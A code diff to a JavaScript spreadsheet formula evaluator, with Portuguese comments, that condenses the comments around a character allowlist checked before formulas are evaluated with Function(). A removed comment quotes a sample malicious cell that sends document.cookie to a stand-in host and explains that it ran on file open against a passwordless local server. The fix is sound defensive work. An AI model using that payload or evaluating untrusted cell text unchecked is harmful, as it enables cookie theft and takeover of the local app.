@@ -533,34 +533,15 @@ function evaluateFormula(formula, rowData, headers) {
     e2 = e2.replaceAll(ph, val);
   });
 
-  // `=[FCK]+[MPA 28]` virava `[25]+[31]`, e somar duas listas em JavaScript
-  // devolve o TEXTO "2531" em vez de 56. O resultado sai na célula com cara de
-  // número e ninguém confere uma soma de dois campos.
-  // Os colchetes são só a marcação do nome da coluna; depois de trocado pelo
-  // número eles não têm mais função nenhuma.
+  // tira os colchetes: [25]+[31] em JS cola texto e vira "2531", nao 56
   e2 = e2.replace(/\[\s*(-?\d+(?:\.\d+)?)\s*\]/g, '$1');
 
   try {
-    // Depois de trocar os nomes de coluna por números, só pode ter sobrado
-    // conta. Qualquer outra coisa é texto que veio da planilha — e planilha
-    // vem de fora: de cliente, de outro laboratório, de anexo de e-mail.
-    //
-    // Sem esta linha, uma célula escrita `=fetch('http://x/?c='+document.cookie)`
-    // rodava sozinha ao ABRIR o arquivo. Ninguém precisa clicar em nada:
-    // renderBody() calcula as fórmulas para poder mostrar o resultado. E
-    // daqui dá para falar com o próprio programa — salvar por cima do arquivo
-    // do usuário, ler as abas abertas — porque ele atende em 127.0.0.1 sem
-    // senha nenhuma.
-    //
-    // A mesma trava já existia em resolveValExpr, usada pelos filtros.
-    // Faltava justamente no cálculo principal da planilha.
-    //
-    // Os colchetes entram na lista porque a sintaxe daqui é `=[FCK]/2`: o nome
-    // da coluna vira número mas os colchetes ficam, e `[25]/2` é uma conta
-    // válida. Sem eles eu quebrava toda fórmula do programa — foi o autoteste
-    // que pegou. Continuam seguros porque letra, aspas e vírgula estão fora:
-    // sem elas não dá para escrever nome de função nem texto, e `[25]` só pode
-    // ser uma lista de números.
+    // so' conta daqui pra frente. planilha vem de fora (cliente, e-mail) e
+    // uma celula =fetch(...) rodava sozinha ao abrir o arquivo — a grade
+    // calcula as formulas pra mostrar. mesma trava do resolveValExpr.
+    // colchete entra porque a sintaxe aqui e' =[FCK]/2; sem letra e sem aspas
+    // nao da' pra montar nome de funcao nem texto.
     if (/[^0-9+\-*/%.\s()[\]eE]/.test(e2)) return '#ERRO!';
     const r = Function('"use strict"; return (' + e2 + ')')();
     // Divisão por zero / resultado inválido: mostra erro legível na célula
